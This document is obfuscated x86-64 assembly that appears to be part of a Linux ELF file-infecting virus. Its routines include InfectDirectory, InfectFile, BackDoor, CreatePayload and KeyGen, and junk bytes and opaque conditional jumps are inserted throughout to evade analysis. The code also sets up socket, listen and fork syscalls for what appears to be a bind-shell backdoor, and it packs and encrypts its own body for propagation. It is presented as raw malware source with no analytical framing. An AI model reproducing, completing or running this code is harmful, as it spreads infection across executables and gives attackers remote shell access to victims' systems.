    jne         ..@M1exrkL0G5D3
..@eXbDju9GzUe8:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
    mov         r1, r5
%endif
    jmp         $+4
db 0x77, 0xc7
    jmp         ..@kY24iBmBNfPF
..@dL9gu9Rl50NR:
    xor         rcx, rcx
    js          ..@u05ofSk6jFJd
    jns         ..@u05ofSk6jFJd
..@JYAsialzZ1qB:
    VAR         packed, dirs_tmp
    jmp         $+4
db 0x92, 0x5f
    jmp         ..@E2I4fQWwweme
..@LHT4iQucKy1J:
    mov         DWORD [rsp+_UPDATASIG_OFF.keyprev], r3d
    jmp         ..@V0Ct5L1B4UiW
..@p1ew5CPzQb5v:
    add         rsp, _DYNPIE_OFF_size
    jmp         ..@MtuwVjrLiTFn
..@iTbCHZtkTZWQ:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    jl          ..@VJeEIuEaTg6z
    jge         ..@VJeEIuEaTg6z
..@p1Jx7Otp3fUo:
    sub         al, 0x02
    mov         edx, 1
    shl         edx, POSITION_BITS+LENGTH_BITS
    jmp         $+5
db 0x59, 0xd3, 0x40
    jl          ..@12H1ZlHUrWDB
    jge         ..@12H1ZlHUrWDB
..@sbWvbQN1c6Gs:
    add         r1, rax
    jmp         $+3
db 0x3a
    jmp         $+5
db 0x67, 0x83, 0xb5
    jb          ..@oZYOxMgCRbsF
    jae         ..@oZYOxMgCRbsF
..@9ODRTBTdylMk:
    test        rax, rax
    js          ..@eY1arJWvdq6O
    jns         ..@eY1arJWvdq6O
..@ssY5GXYnQjHi:
    mov         al, BYTE [rdi]
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         ..@KkTWOC5CnxA7
..@0l3CCFaOA98M:
    mov         r2, m8
    jmp         $+4
db 0x12, 0xcd
    jb          ..@LizvnCKaACGN
    jae         ..@LizvnCKaACGN
..@aoXbmZvLqLzn:
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+4
db 0xc7, 0x55
    jmp         ..@68bZr7nVo4h9
..@qFCKTajb7Cpo:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    je          ..@VDHhRlFFyPaR
    jne         ..@VDHhRlFFyPaR
..@YFqlXxg84I5w:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
    push        QWORD 0x0
    push        WORD 0x5c11
%endif
    jb          ..@EWqUDTs1XERs
    jae         ..@EWqUDTs1XERs
AddSizeMappedFile:
    jmp         ..@VLNmrVu8Qy2l
..@LYuICe0K3Bpc:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    je          ..@Q3IJyqmIOeaY
    jne         ..@Q3IJyqmIOeaY
..@OS46U6wShd68:
    jmp         ..@syCZbIhAvCWy
    jmp         $+3
db 0x60
    je          ..@bfVM4E4yJI4L
    jne         ..@bfVM4E4yJI4L
..@esPHhK4Ul3WS:
    sub         r2, m6
    jmp         $+3
db 0xd0
    jmp         $+4
db 0xc4, 0x85
    jmp         $+4
db 0x6f, 0x81
    jmp         ..@XYGFs6zDJvpD
..@WanNv4PoainN:
%ifdef X86_32
    push        ebp
%endif
    jmp         ..@9ly2tHET621H
..@A9on1tQ51sfP:
    add         ecx, 1
    cmp         cl, 0x4
    jb          ..@YfWNskEn8Rrd
    jae         ..@YfWNskEn8Rrd
..@HQv7bZVpoYP7:
    add         eax, 0x57
    jmp         ..@kBE74jCL77Tj
..@uECKu6hbDK6w:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+4
db 0xf4, 0x8f
    je          ..@b9czsxQuGhcQ
    jne         ..@b9czsxQuGhcQ
..@gxhBCcbEIKfZ:
    add         rsp, _PROC_OFF_size
    jmp         $+4
db 0xe6, 0xd0
    jmp         $+5
db 0x22, 0x08, 0x78
    jmp         $+3
db 0x65
    js          BackDoor
    jns         BackDoor
..@58CRgkT3QkkE:
    movdqu      xmm1, oWORD [rsp+0x80]
    aesenc      xmm0, xmm1
    jl          ..@45EBZCxZ5b8s
    jge         ..@45EBZCxZ5b8s
..@VLXZwAjLLi0U:
    mov         r2, QWORD [r5+file.filesize]
    jmp         $+5
db 0x30, 0xe2, 0x75
    jmp         ..@ZGy8sGHNBEAI
..@pJ7MmZ4mO5c3:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    jl          ..@OluxxF5ZuoOI
    jge         ..@OluxxF5ZuoOI
..@bfVM4E4yJI4L:
    mov         rax, 1
    jmp         $+3
db 0x4e
    jb          ..@syCZbIhAvCWy
    jae         ..@syCZbIhAvCWy
..@tEn8ftZFd0n3:
    jl          ..@8QAXba70U4wC
    js          ..@mtJa9ijWkcwW
    jns         ..@mtJa9ijWkcwW
..@RycmVVyJdcBn:
%ifdef X86_64
    mov         r10d, 0x01
%endif
    jmp         ..@GKxSo6Nm2dqa
..@VtvsaFeFrJXI:
    jne         ..@PNBnYJNEowRv
    jmp         ..@YrZw4uTTqdsh
..@5nos5Ui09qPo:
    mov         rax, (-1)
    jmp         $+3
db 0x89
    jmp         ..@rgBKFLrK6dDB
..@gayiBoGhi29T:
    je          ..@S4NA4XeHpJfq
    jmp         $+4
db 0xef, 0xa3
    jl          ..@FKfO3d2JWzB0
    jge         ..@FKfO3d2JWzB0
..@zkkQ1Ui18n6b:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         $+4
db 0x4e, 0xe9
    jl          ..@m0A2sMQpM9v5
    jge         ..@m0A2sMQpM9v5
..@EZE9iwSxq9yy:
    mov         r2, 1
    jl          ..@55CfYajl7yup
    jge         ..@55CfYajl7yup
..@e4RyToQJB4CT:
    syscall
    jmp         $+3
db 0xda
    js          ..@uqCdQRkw0GsO
    jns         ..@uqCdQRkw0GsO
..@pAIN7mn4WXUV:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev+2]
    call        WORDToDWORDASCII
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         $+5
db 0xbc, 0x48, 0xaf
    jmp         $+4
db 0xf1, 0x8d
    js          ..@zCV60bhmZqmS
    jns         ..@zCV60bhmZqmS
..@h5jCjhf3R3Or:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         ..@eAXlBhhBYsxt
..@cALcSZpyJMbC:
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    mov         r4, 0
    jl          ..@1ZOPXUYeuHuU
    jge         ..@1ZOPXUYeuHuU
..@k0CyxSfYdM35:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+3
db 0xd0
    je          ..@fp9eZhDIfPGd
    jne         ..@fp9eZhDIfPGd
..@iUaD78RveJ6I:
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    jmp         ..@PNBnYJNEowRv
..@MObPOj3xQcpZ:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x1e
    jl          ..@0IIp2OWi53CV
    jge         ..@0IIp2OWi53CV
..@2mNgUDMEfWu7:
    push        r5
    push        r2
    push        r1
    jmp         ..@mKccUaDkNFmj
..@x1isImduQCbA:
    jle         ..@iUaD78RveJ6I
    jmp         $+3
db 0x50
    jmp         $+3
db 0x5c
    jmp         $+4
db 0x54, 0xd0
    jmp         $+4
db 0x7f, 0x62
    jl          ..@3s9EtEQOm3eM
    jge         ..@3s9EtEQOm3eM
..@GxCfEmiAaKgr:
    mov         r2, vsp
    jmp         $+4
db 0x4f, 0x70
    jmp         $+5
db 0xcb, 0xd5, 0x30
    je          ..@SNWZsjpSwFXN
    jne         ..@SNWZsjpSwFXN
..@RJVDwzRV7ytf:
    pop         rbp
    jb          ..@dL9gu9Rl50NR
    jae         ..@dL9gu9Rl50NR
..@0IvePlfJ85zH:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    jl          ..@y58QRbaV5LLq
    jge         ..@y58QRbaV5LLq
..@od2lbyvZPfHQ:
    mov         r3, rax
    and         r3, 0xfff 
    jmp         $+5
db 0x36, 0x30, 0x44
    jmp         $+3
db 0xfc
    jmp         $+5
db 0x1a, 0x0b, 0x0c
    jmp         $+5
db 0x10, 0x3b, 0xb0
    jmp         ..@gf0e9na0oOrb
..@IZa6HoSJJoXZ:
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+5
db 0x13, 0x31, 0x0e
    jmp         $+3
db 0xcc
    js          ..@sA6Q4ORuiUc0
    jns         ..@sA6Q4ORuiUc0
..@kVgkm7UZZICU:
    xor         rax, rax
    jmp         $+5
db 0xb6, 0x11, 0xe5
    jb          ..@jf20FNdzqHka
    jae         ..@jf20FNdzqHka
..@lzrDxj6qTLfB:
    mov         rax, SYS_MUNMAP
    jl          ..@KaOHn9Pui7kt
    jge         ..@KaOHn9Pui7kt
..@Qh5n9d3hstQN:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         $+4
db 0x7c, 0xe4
    jb          ..@o6WsNbpb5d3H
    jae         ..@o6WsNbpb5d3H
..@Ac5lC1TclbHj:
    je          ..@pUr94PuFzzy9
    je          ..@aw5E0PEu2mSh
    jne         ..@aw5E0PEu2mSh
..@IVoUfg0Uj2f3:
    mov         ecx, WINDOW_LENGTH
    jmp         $+4
db 0xd9, 0xff
    jmp         $+3
db 0x4b
    jb          ..@FLpKYqDEEr1F
    jae         ..@FLpKYqDEEr1F
..@bHauIvKQXg0V:
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    add         rdi, rax
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         ..@KkOMScmf90Av
..@fneT9V2mvB7k:
    add         rsp, _VADDR_OFF_size
    jmp         $+4
db 0xbb, 0xc6
    js          ..@4FLbNgeTwHyr
    jns         ..@4FLbNgeTwHyr
..@7DH523LGHjXk:
    mov         r3, _decrypt-_virus
    jmp         $+5
db 0x1d, 0x2c, 0x18
    je          ..@imZViklUcrxn
    jne         ..@imZViklUcrxn
..@Sk7hy1eOe4M2:
    sub         r2, 1
    cmp         r2, 0
    jmp         $+3
db 0xbd
    jl          ..@Ac5lC1TclbHj
    jge         ..@Ac5lC1TclbHj
..@wzWIAepSlW5E:
    mov         rdi, m6
    add         rdi, key-_start
    js          ..@JTITGlwcFIPr
    jns         ..@JTITGlwcFIPr
..@mOCnibGWj68Q:
    pop         r1
    cmp         r1, 0x00
    jmp         $+4
db 0x41, 0x5e
    jmp         $+5
db 0x25, 0x21, 0x4c
    jmp         ..@OxFw1VpntzaZ
..@l3ypxVgUijMH:
    mov         ax, dx
    and         ax, 1111b
    jmp         $+4
db 0xa6, 0x26
    jmp         ..@EXIkV2ejR5gj
..@kbnYt8Cp5h5F:
    mov         ecx, 0x8
    jl          ..@Lsg6PlLgEd8U
    jge         ..@Lsg6PlLgEd8U
..@TWucxZHmbYhg:
    shl         ebx, LENGTH_BITS
    jmp         $+4
db 0xe1, 0x7a
    js          ..@uZVxEykDyzDX
    jns         ..@uZVxEykDyzDX
..@EWqUDTs1XERs:
%ifndef ENABLE_DEBUGGING
    push        WORD 0x02
    mov         r2, rsp
    mov         r3d, 0x10
%endif
    jmp         $+5
db 0x94, 0x51, 0x0e
    jmp         $+5
db 0xa1, 0xa2, 0x1b
    jmp         ..@Qh5n9d3hstQN
GetNewProgramVaddr:
    jmp         ..@hWhUPkZRMkjo
..@VDHhRlFFyPaR:
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         ..@0H25Tptoz0v1
..@DpiAJGFZCREQ:
    call        MemMove
    jb          ..@CuYmEEbfZ5CR
    jae         ..@CuYmEEbfZ5CR
..@ohA1BFTMLJKV:
    add         r5, rax
    jmp         $+5
db 0xca, 0x98, 0x5d
    jmp         $+3
db 0x6a
    jl          ..@KVxYCpanV1V3
    jge         ..@KVxYCpanV1V3
..@N44cNTR53Fdw:
    xor         rax, rax
    xor         rcx, rcx
    js          ..@LolRVpeqhKu4
    jns         ..@LolRVpeqhKu4
..@H1Ia6DDyidL1:
    mov         [r1], rax
    add         r1, 1
    add         r2, 1
    js          ..@Uw90v548leUl
    jns         ..@Uw90v548leUl
..@qODQsTwpPvV4:
    jmp         ..@kBE74jCL77Tj
    jmp         $+3
db 0xa9
    jmp         $+3
db 0xfd
    jmp         $+5
db 0xa6, 0xec, 0xcb
    jb          ..@HQv7bZVpoYP7
    jae         ..@HQv7bZVpoYP7
..@KCZSptnQ6uy7:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    jmp         ..@D7pyA1ASEju3
..@2OEPjeS3JBVD:
%ifdef X86_64
    xor         rdx, rdx
    xor         r9, r9
    mov         rsi, original_virus_len+PADDING
%endif
    jmp         ..@vjtUcgFbXWWF
..@xpc5QenzkoUe:
    mov         eax, 1
    jmp         $+5
db 0x26, 0xe7, 0xef
    jmp         $+4
db 0xf7, 0x49
    jmp         $+5
db 0x21, 0xc4, 0x10
    jmp         ..@tgNnZJlW6LcX
..@hyAvOBC2gnFP:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+5
db 0xc8, 0x0c, 0x84
    jmp         ..@gMdfoIlYoobW
..@qoMMp3vT2alA:
    ret
    je          ..@bNw7eMXmCBH2
    jne         ..@bNw7eMXmCBH2
..@JEsPfrtotIMX:
    xor         r2, r2
    xor         r3, r3
    js          ..@WSA1qYXYUiNQ
    jns         ..@WSA1qYXYUiNQ
..@bYBwyrVMkoY7:
    xor         rax, rax
    ret
    jmp         $+3
db 0x15
    jb          NonBinaryFile
    jae         NonBinaryFile
..@5ilLYS2I5M9a:
    mov         rax, SYS_GETUID
    jb          ..@XshW7nV0aep8
    jae         ..@XshW7nV0aep8
InfectDirectory:
    jmp         ..@3WlsnFl6Tan8
..@pTpsHdQLSgvM:
%ifndef ENABLE_DEBUGGING
    mov         r1d, 0x2
    mov         r2d, 0x1
    mov         r3d, 0x6
%endif
    jmp         ..@3KHkA8TxcJpr
..@bIll4HF32IDC:
    call        KeyGen
    xor         r2, r2
    jb          ..@XmZfth0CNx7B
    jae         ..@XmZfth0CNx7B
..@9rQPC3yod4Kx:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_FORK
    syscall
    test        eax, eax
%endif
    jmp         $+5
db 0x6a, 0xb3, 0x2f
    jmp         ..@RHBRnSbuJzJT
..@S4NA4XeHpJfq:
    xor         rax, rax
    jmp         $+4
db 0x07, 0xd5
    jmp         $+5
db 0x7c, 0xaf, 0xd6
    jmp         ..@3vfYZQF1Sa9X
..@3FmWaSiu249p:
    mov         DWORD [r5+file.filefd], 0x00
    jmp         $+4
db 0x80, 0x1d
    jmp         ..@CXhscSmKAXDO
..@dPtRLJLMCA2M:
    mov         r5, r1
    jl          ..@3zzD74bHyZpq
    jge         ..@3zzD74bHyZpq
..@OQmgS389TDyp:
    ret
    jmp         ..@bYBwyrVMkoY7
..@UrlOd9e8J1NS:
    xor         rax, rax
    jmp         $+4
db 0x82, 0xa9
    js          ..@FZGXoziGoTcS
    jns         ..@FZGXoziGoTcS
..@OPZvrfxrkDLD:
    mov         rax, r2
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3 
    jmp         $+5
db 0x8e, 0xc5, 0x4d
    jmp         $+4
db 0xce, 0x33
    jmp         $+3
db 0x3d
    jmp         ..@8uj3mVg8sF3h
..@JppFSase8VQf:
    je          ..@mOCnibGWj68Q
    push        r1
    jmp         $+3
db 0x06
    jmp         $+5
db 0xdb, 0xdb, 0xaf
    js          ..@xLC8SXjRnayr
    jns         ..@xLC8SXjRnayr
..@WoIYn3Opkhrz:
    cmp         BYTE [r1+5], '/'
    jb          ..@m4n9BhBeAwJk
    jae         ..@m4n9BhBeAwJk
..@XYGFs6zDJvpD:
    sub         r2, non_encrypted_len
    and         r2, 0xfffffffffffffff0
    jmp         $+5
db 0x3f, 0xd7, 0xf7
    jmp         $+5
db 0x1c, 0xff, 0x2c
    js          ..@QCpd4uZjkw0P
    jns         ..@QCpd4uZjkw0P
..@aj6q8cIIVpfY:
    xor         rdx, rdx
    jmp         ..@NrRy1Lmc4qQA
..@CuYmEEbfZ5CR:
    mov         r1, m6
    jmp         $+4
db 0x77, 0x6e
    jmp         $+3
db 0x6f
    js          ..@m0sgDP4OCmWV
    jns         ..@m0sgDP4OCmWV
..@FbQeVpoWJ7y4:
    jmp         ..@bYBwyrVMkoY7
    jmp         $+4
db 0x1c, 0x7c
    jmp         ..@ApIknvEJwJIw
LzssEncoder:
    jmp         ..@BXkFpl3DJdd7
..@6eG625dUx27k:
    CFILE       DWORD [rsp+_KEYGEN_OFF.fd]
    jmp         ..@1akUl7sSnYSx
..@X1MwlIa1sqh7:
    mov         r2, 11b
    jmp         $+3
db 0xbc
    jmp         $+5
db 0x54, 0x21, 0xfb
    jmp         ..@sGrVZVva3l0X
..@AHIvu7cS21oK:
    mov         r3, rax
    jb          ..@g6iOuwe3UEvK
    jae         ..@g6iOuwe3UEvK
..@bkn84TTw27cx:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         ..@0ImD6hvfRinT
..@7xWT26ppUrJe:
    push        r1
    mov         r5, r2
    jmp         $+5
db 0xba, 0x43, 0xf1
    jb          ..@26e87ViHkH00
    jae         ..@26e87ViHkH00
..@E2kxgvVvDGea:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jl          ..@8SapOC3z2aHH
    jge         ..@8SapOC3z2aHH
..@3GIeKabH2Kqi:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    je          ..@kDMOcmR31cSm
    jne         ..@kDMOcmR31cSm
..@5iXHD90CKL3l:
    add         m7, rax
    mov         rdi, m6
    jb          ..@dPRPNY3tR95R
    jae         ..@dPRPNY3tR95R
..@XadFaP4jdPdZ:
    cmp         r4, 0x00
    js          ..@x1isImduQCbA
    jns         ..@x1isImduQCbA
..@fYrD7naobDpu:
    mov         r2, r4
    call        AddSizeMappedFile
    cmp         rax, (-1)
    js          ..@EV58ycjU5KXi
    jns         ..@EV58ycjU5KXi
..@MiHjpKL09U0o:
    movdqu      xmm1, oWORD [rsp+0x60]
    jl          ..@2teYnmlDrHX1
    jge         ..@2teYnmlDrHX1
..@GuxtU8elQcDE:
    cmp         rax, 0xffffffffffffffff
    jmp         $+5
db 0x81, 0xcc, 0x98
    jmp         ..@gayiBoGhi29T
..@1YbZ7zcthpJv:
    mul         r2
    jb          ..@wnsOuULZFzaF
    jae         ..@wnsOuULZFzaF
..@tvoLh5y1XEmp:
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    js          ..@migVR7dNabyO
    jns         ..@migVR7dNabyO
..@2teYnmlDrHX1:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x70]
    aesenc      xmm0, xmm1
    jb          ..@58CRgkT3QkkE
    jae         ..@58CRgkT3QkkE
..@ZGy8sGHNBEAI:
    mov         r4, 0x1
    js          ..@5Mjjfmt87Qh2
    jns         ..@5Mjjfmt87Qh2
..@ZngbToYDtra8:
    pop         r3
    jmp         ..@OeFllZ9PjTUb
..@dPRPNY3tR95R:
    add         rdi, virus_len-_start
    mov         rsi, m7
    jl          ..@LR5OpfgsLB9Z
    jge         ..@LR5OpfgsLB9Z
..@zOXkP96rp8uu:
    call        CreatePayload
    pop         r3
    pop         r2
    jmp         $+4
db 0x32, 0x69
    jmp         $+5
db 0xe4, 0x3b, 0x58
    jmp         ..@mVuQmnJqJ7J1
..@9mA5QqxaeTBV:
    je          ..@pwEsT9P2a0Ko
    cmp         rdi, rsi
    jbe         ..@YRbIEf0rQTJ0
    jl          ..@boH1yujloq1f
    jge         ..@boH1yujloq1f
..@IjRttg3t6N6O:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+3
db 0xe8
    jmp         $+3
db 0xc7
    jmp         ..@jZE0KbF56hLX
..@JJ2MV2v4Y1ja:
    call        Strcpy
    mov         BYTE [r1], '/'
    add         r1, 1
    jmp         $+5
db 0x70, 0xed, 0x05
    jmp         ..@Op3AO1zqJ53o
..@y58QRbaV5LLq:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jmp         ..@rrhxweEtkNJB
..@FF766E0s6vs1:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
%endif
    jmp         ..@XOaPelqWKd8Y
..@hbYQSFjCRxsv:
    push        r1
    jmp         $+4
db 0x62, 0xe0
    jmp         ..@tmGri1wDxDnA
..@f1fI73boVJPS:
    call        IsELFComplete
    test        al, al
    jnz         ..@bYBwyrVMkoY7
    js          ..@8seXsK1ZcJhb
    jns         ..@8seXsK1ZcJhb
..@uYKfjvOfaG7K:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    jmp         $+3
db 0x02
    jmp         ..@UINi9OkhhnU6
..@NkQqZscqIDwR:
    syscall
    jl          ..@Jn7fWBHN6bdC
    jge         ..@Jn7fWBHN6bdC
..@MkOcKoVlldpi:
    cmp         BYTE [r1], 0x00
    jmp         ..@YvPMJhKOhnEG
..@3ULUk3rGaydV:
    cmp         BYTE [r1+4], ELFCLASS
    jne         ..@bNw7eMXmCBH2
    cmp         BYTE [r1+16], ET_EXEC
    jmp         ..@V2710m4Q9QJj
..@WXBq7ncNMCUb:
    mov         rax, r4
    jmp         $+4
db 0x7b, 0xc8
    jmp         ..@HQVzu5xPc9Fh
..@WBOF99HySOIC:
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    jmp         $+5
db 0x43, 0x49, 0x07
    jmp         $+3
db 0xf5
    jl          ..@xMyJRYMoIFlD
    jge         ..@xMyJRYMoIFlD
..@hXKkcpHCEcm6:
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    jmp         ..@SyM7eZlcX2dK
..@x2tza9GvIctS:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+5
db 0xf9, 0xe0, 0x92
    jmp         $+3
db 0x95
    jl          ..@UjqNG9wkxOP1
    jge         ..@UjqNG9wkxOP1
..@84RYeE8cWOQW:
    mov         rdi, QWORD [r5+file.fileptr]
    mov         eax, 0x0
    jmp         $+3
db 0x3e
    jmp         $+3
db 0xd6
    jmp         $+4
db 0xd3, 0x26
    jmp         $+5
db 0x64, 0xa7, 0x2a
    jmp         $+4
db 0xb2, 0xb2
    js          ..@kwCpyPK00bPG
    jns         ..@kwCpyPK00bPG
..@VqLOzQ84fSd0:
    push        r5
    jmp         $+3
db 0xb1
    jmp         $+3
db 0x19
    jb          ..@8HT5ZQuiELPw
    jae         ..@8HT5ZQuiELPw
..@XdnumjtPN1Lh:
    xor         r2, r2
    jmp         $+5
db 0x49, 0x42, 0xcb
    jb          ..@IcFiH2YmfJeS
    jae         ..@IcFiH2YmfJeS
..@toFnC4VnBGTY:
    call        InfectFile
    jl          ..@qFCKTajb7Cpo
    jge         ..@qFCKTajb7Cpo
DestroyPayload:
    jmp         ..@4JXnD2YXysic
..@FZGXoziGoTcS:
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    mul         rbx
    jmp         $+5
db 0x4e, 0x58, 0x76
    jl          ..@bHauIvKQXg0V
    jge         ..@bHauIvKQXg0V
..@uSMOPvMHfrPF:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    jmp         $+3
db 0x3b
    js          ..@tRmiCNu3ltr7
    jns         ..@tRmiCNu3ltr7
..@LEqigQXne6r3:
    ret
    jmp         $+4
db 0xd4, 0xc0
    jmp         $+3
db 0x1a
    jmp         $+4
db 0x58, 0xed
    je          InfectDirectory
    jne         InfectDirectory
..@s4F9BZ9eUsLA:
    mov         QWORD [r2+p_h.p_vaddr], r3
    jl          ..@Z8pcSD4thL7H
    jge         ..@Z8pcSD4thL7H
..@4JXnD2YXysic:
    xor         rax, rax
    xor         rcx, rcx
    jmp         $+4
db 0x35, 0x0f
    jl          ..@2i02cSiJ9Wvr
    jge         ..@2i02cSiJ9Wvr
..@JSHnKavrijT8:
    mov         QWORD [r2+p_h.p_memsz], r4
    jmp         ..@wVzdo6sGLVOf
..@ut6R1XztP6B8:
    push        r5
    jl          ..@6kUWSUeNATRJ
    jge         ..@6kUWSUeNATRJ
..@QsH7RXLyCEiZ:
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    js          ..@y81NiZorJNQy
    jns         ..@y81NiZorJNQy
..@eAXlBhhBYsxt:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jge         ..@GZajGxd8TeMx
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jmp         ..@MUOnXmd9v8v4
..@X9ySHtW3TjNw:
    add         rcx, 2*bytes
    js          ..@LOed8AQdIO3X
    jns         ..@LOed8AQdIO3X
..@Iw3uNV4DBGXO:
    ret
    jmp         $+5
db 0x0b, 0x53, 0xcc
    js          AddSizeMappedFile
    jns         AddSizeMappedFile
MapFile:
    jmp         ..@7xWT26ppUrJe
..@HQVzu5xPc9Fh:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3
    add         rax, p_h.p_type
    jmp         ..@up5F1XqyTjE9
..@ZPNcupEFhfDg:
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+4
db 0x23, 0x14
    je          ..@yyG3ohBDOe5u
    jne         ..@yyG3ohBDOe5u
..@LUMndREwqJLe:
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    mov         QWORD [rdi], rsi
    xor         rcx, rcx
    jmp         $+3
db 0x7b
    jmp         $+5
db 0x1b, 0x00, 0xed
    jb          ..@wzWIAepSlW5E
    jae         ..@wzWIAepSlW5E
..@4YGWam9qQO2q:
%ifndef ENABLE_DEBUGGING
    mov         r2d, 0x2
%endif
    jmp         $+5
db 0x8e, 0x7b, 0xea
    jmp         $+4
db 0x35, 0x41
    jb          ..@lTeycR7SxrQW
    jae         ..@lTeycR7SxrQW
..@V3LyOSiF9CYY:
    xor         rdx, rdx
    jmp         ..@wXFP0SHfiI7v
..@5HYdVdvywJe3:
    xor         rdi, rdi
    jmp         $+4
db 0x32, 0x2b
    jmp         ..@fOiM9BT8Uleq
..@pG8LS2prWnzg:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jnz         ..@VJeEIuEaTg6z
    jmp         ..@VugmyxpEj1I0
..@m0sgDP4OCmWV:
    add         r1, non_packed_len+PADDING
    jl          ..@0l3CCFaOA98M
    jge         ..@0l3CCFaOA98M
..@SNWZsjpSwFXN:
    mov         r3, non_packed_len
    jmp         ..@DpiAJGFZCREQ
..@nlvHNFCj64YV:
    jl          ..@UrlOd9e8J1NS
    mov         rax, 1
    jmp         ..@p1ew5CPzQb5v
    jmp         $+4
db 0x9f, 0xd2
    jmp         ..@wFC8XXSzHOhP
..@jRI6wcc2yn1E:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
    mov         eax, SYS_LISTEN
%endif
    jmp         ..@OOH6EC9cwl8H
..@5Mjjfmt87Qh2:
    xor         rax, rax
    jmp         $+4
db 0x1f, 0xfe
    jmp         $+4
db 0x05, 0x88
    jmp         ..@YONs6NKdbIkU
..@TxLiJiEWJJDa:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    jmp         ..@RrWGpSQkAd8A
..@3ZSqvjuz1RkE:
    mov         rcx, m7
    sub         rcx, m6
    js          ..@RHjP9QzC8yCi
    jns         ..@RHjP9QzC8yCi
..@TzMiHwPPJbqm:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         ..@nj3OY9mz86fQ
..@RwzwiGMb79T0:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    xor         r1, r1
    call_vsp    ExitProgram
    jl          ..@8QAXba70U4wC
    jge         ..@8QAXba70U4wC
..@23fM2yn3E3hW:
%ifndef ENABLE_DEBUGGING
    syscall
    test        eax, eax
%endif
    jmp         $+3
db 0xdf
    jmp         $+5
db 0x20, 0x80, 0x8e
    jmp         ..@dHlgbbMMngiN
..@TE3igxxJViwn:
    jmp         ..@mOCnibGWj68Q
    jmp         $+5
db 0x50, 0x4d, 0x83
    jmp         ..@GPxEUlACx9hI
..@AAFWJ8b7JrUO:
    add         rsp, _UPDATASIG_OFF_size
    pop         r5
    jmp         ..@iYqFMcfWnv36
..@YrZw4uTTqdsh:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    jmp         ..@rf8gwgyVVVPY
..@gtt0fxkXtw6U:
    ret
    jmp         $+4
db 0x87, 0x81
    jmp         $+3
db 0x1a
    jmp         $+3
db 0x19
    jmp         $+3
db 0x80
    je          MemMove
    jne         MemMove
..@7OvMR6pIGdVD:
    push        r1
    push        r2
    push        r3
    jmp         $+5
db 0xf7, 0xbc, 0xab
    jmp         $+5
db 0xc8, 0x71, 0xac
    jl          ..@8sc3kvuGT1KA
    jge         ..@8sc3kvuGT1KA
..@rgBKFLrK6dDB:
    pop         r1
    jb          ..@Iw3uNV4DBGXO
    jae         ..@Iw3uNV4DBGXO
..@ERlMWnp5ZKgL:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    js          ..@9L6wNo5aDowk
    jns         ..@9L6wNo5aDowk
..@Txjiihpf5KPS:
    cmp         QWORD m6, 0x00
    je          ..@iUaD78RveJ6I
    cmp         QWORD m7, 0x00
    jmp         $+4
db 0x7e, 0xd1
    jl          ..@RUHGcBAMf4mR
